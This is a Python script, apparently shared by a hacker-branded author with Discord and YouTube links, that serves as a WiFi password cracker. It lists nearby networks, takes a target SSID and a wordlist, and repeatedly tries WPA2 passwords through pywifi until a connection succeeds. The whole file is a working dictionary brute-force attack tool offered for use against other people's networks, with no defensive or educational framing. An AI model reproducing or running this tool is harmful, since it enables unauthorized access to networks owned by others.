# WiFi Password Cracker
#discord: https://discord.gg/xbN3XSHYjx
#youtube: https://www.youtube.com/@IIIHaZaRd
#pytholearn


import pywifi
import time
import os
from pystyle import Colors,Write
from rich.console import Console
from rich.highlighter import Highlighter
from rich import *
from rich.progress import Progress
import ctypes

os.system('cmd /c "cls"')
ctypes.windll.kernel32.SetConsoleTitleW("HAZARD | Wifi Cracker V 1.0")
print("""                                                          
                                                           V 1.0
                                           [red]    ______[/red]  [yellow]____  ___   __________                    [/yellow]         [red]FOR[/red] [red on white]FREEDOM[/red on white]
                                           [red]   / ____/[/red] [yellow]/ __ \/   | / ___/ ___/
                                           [red]  / /_  [/red]  [yellow]/ /_/ / /| | \__ \\__ \ 
[yellow]>App For Crack [/yellow][red]WiFi Pass[/red]                   [red] / __/ [/red]  [yellow]/ ____/ ___ |___/ /__/ / 
[red]>Made By: [/red][yellow]HAZARD[/yellow][red]#4058[/yellow]                      [red]/_/   [/red]  [yellow]/_/   /_/  |_/____/____/                               
                                                                     
                                                     [/yellow] [magenta]IRAN ON TOP![/magenta]
""")                                         
print()
Write.Print("------------------------------------------------------------------------------------------------------------------------\n", Colors.red_to_yellow, interval=0.009)

time.sleep(1)
os.system("netsh wlan show networks")
ssid = input("Please Enter WiFi Target SSID >>> ")
password_list= input("Please Enter Password List Path >>> ")
print("[yellow]Start[/yellow] [red]Cracking[/red]...")


def wifi_password_cracker(ssid, password_file):
    wifi = pywifi.PyWiFi()  
    iface = wifi.interfaces()[0]  

    iface.disconnect()  

    profile = pywifi.Profile() 
    profile.ssid = ssid  
    profile.auth = pywifi.const.AUTH_ALG_OPEN  
    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK) 
    profile.cipher = pywifi.const.CIPHER_TYPE_CCMP 

    # خواندن فایل پسورد
    with open(password_file, "r") as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()

        profile.key = password 

        iface.remove_all_network_profiles()  

        tmp_profile = iface.add_network_profile(profile)

        iface.connect(tmp_profile)  

        time.sleep(5)
        if iface.status() == pywifi.const.IFACE_CONNECTED:
            print("[yellow]Password :[/yellow] "+password)
            input("\nPress any key to exit...")
            return
        else:
            print(f"[red on white]Wrong Password : "+password)

        
    print("[black on red]Password Not Found")


wifi_password_cracker(ssid, password_list)

#discord: https://discord.gg/xbN3XSHYjx
#youtube: https://www.youtube.com/@IIIHaZaRd
#pytholearn
